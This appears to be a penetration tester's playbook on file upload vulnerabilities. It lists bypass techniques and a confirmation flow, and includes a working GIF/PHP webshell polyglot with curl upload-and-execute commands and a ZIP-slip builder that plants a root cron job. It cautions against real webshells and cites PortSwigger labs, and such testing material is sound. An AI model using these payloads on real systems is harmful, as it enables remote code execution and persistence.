# File upload vulnerabilities — playbook

## when to try
- Avatar / profile picture / banner / document / report / CSV import / SVG /
  ZIP upload features.

## bug archetypes
- **Direct upload of executable**: `.php`, `.phtml`, `.phar`, `.jsp`, `.aspx`,
  `.asp;.jpg` (IIS), `.cer`, `.shtml` — into a web-served dir → RCE.
- **Content-type bypass**: server checks `Content-Type` only → set `image/jpeg`
  but send PHP content (still must be reachable via `.php` URL).
- **Magic-byte bypass**: server checks file head → prepend GIF89a then PHP.
- **Double extension**: `shell.php.jpg`, `shell.jpg.php`, mixed-case `.PhP`.
- **Null byte**: `shell.php%00.jpg` — older.
- **Path traversal in filename**: `../../var/www/shell.php`.
- **SVG XSS**: SVG with `<script>` or `<foreignObject>` rendered inline.
- **SVG XXE**: SVG with `<!DOCTYPE>` if image pipeline parses XML.
- **ZIP slip**: archive containing `../../etc/cron.d/x` — extracted into wrong dir.
- **Content sniffing**: file is HTML but served from upload dir without `X-Content-Type-Options: nosniff` → stored XSS.
- **Image conversion**: ImageTragick (`.mvg`/`.svg` w/ `pango:`/`fill:url`), GhostScript CVE-2018-16509, GraphicsMagick legacy.
- **Pixel flood / decompression bomb**: image with absurd dimensions → DoS.

## confirmation flow
1. Upload a normal image. Note the URL pattern of the result (`/uploads/UUID.jpg`).
2. Try renaming to `.php` keeping image bytes — does the server rename or accept?
3. Try `<?php echo "RCETEST"; ?>` saved as `.png` then access — if executed, you have RCE.
4. SVG with `<svg onload=alert(1)>` rendered in app HTML → stored XSS.
5. ZIP-slip: build an archive with `evil.txt` and `../evil.txt`, upload, see if extraction places one outside.

## exploitation snippet
GIF + PHP polyglot:
```bash
printf 'GIF89a\n<?php system($_GET["c"]); ?>' > shell.gif.php
curl -sk -F "file=@shell.gif.php;type=image/gif" https://t/upload
curl -sk 'https://t/uploads/shell.gif.php?c=id'
```

ZIP slip builder:
```python
import zipfile
with zipfile.ZipFile('slip.zip','w') as z:
    z.writestr('../../../etc/cron.d/pwn', '* * * * * root id > /tmp/p\n')
```

## caveats
- Don't drop a real webshell on a real target. Confirm path-of-execution via a benign marker (`<?php echo md5("rcetest"); ?>` returning the hash) and stop.
- ImageMagick polices have hardened a lot since 2016 — many programs immune.

## provenance
PortSwigger File Upload labs. ImageTragick CVE-2016-3714. ZipSlip 2018.
